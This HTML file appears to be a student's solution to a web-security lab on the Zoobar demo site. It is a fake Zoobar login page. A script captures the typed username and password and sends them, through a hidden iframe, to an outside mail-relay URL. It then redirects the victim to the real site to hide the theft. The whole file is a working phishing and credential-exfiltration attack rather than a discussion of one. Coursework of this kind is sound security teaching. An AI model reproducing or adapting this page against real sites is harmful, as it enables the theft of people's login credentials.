<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
        <title>
          Login - Zoobar Foundation
        </title>
        <script> var myZoobars = undefined;</script>
        <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
        <script>
            if(myZoobars != undefined){
                window.location.href="answer-2.html";
            }
        </script>
    </head>
    <body>        
        <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Objective Research</a></h1>
        <h2>Supporting the brightest advocates of the United States</h2>
      
        <div id="login" class="centerpiece">
            <form target="formtarget2" name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" id="loginform">
                <table>
                    <tr>
                        <td>Username:</td>
                        <td><input type="text" name="login_username" size="20"
                        autocomplete="no" value="" id="login_username"></td>
                    </tr>
                    <tr>
                        <td>Password:</td>
                        <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no" id="login_password">
                        <input type="submit" name="submit_login" value="Log in" id="login_submit">
                        <input type="submit" name="submit_registration" value="Register"></td>
                    </tr>
                </table>
                <input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
            </form>
        </div>
        <iframe id="formtarget2" name="formtarget2" onload="foo()" style="visibility:hidden;"></iframe>
        <script>
            var username = document.getElementById("login_username");
            var password = document.getElementById("login_password");
            var bar = 0;
            var foo = function(){
                bar++;
                //alert("foo " + bar);
                if(bar === 2){
                    var url = 'http://css.csail.mit.edu/6.858/2014/labs/sendmail.php?' + 'to=lut@mit.edu' + '&payload=' + username.value + ',' + password.value + '&random=' + Math.random();
                    document.getElementById("formtarget2").src = url;
                    console.log("foo done");
                }else if(bar === 3){
                    baz();
                }
            }
            var baz = function(){
                console.log("baz");
                window.location.href="http://localhost:8080/zoobar/index.cgi/";
            }
        </script>
        <div class="footer warning"></div>
        <script>document.loginform.login_username.focus();</script>
    </body>
</html>
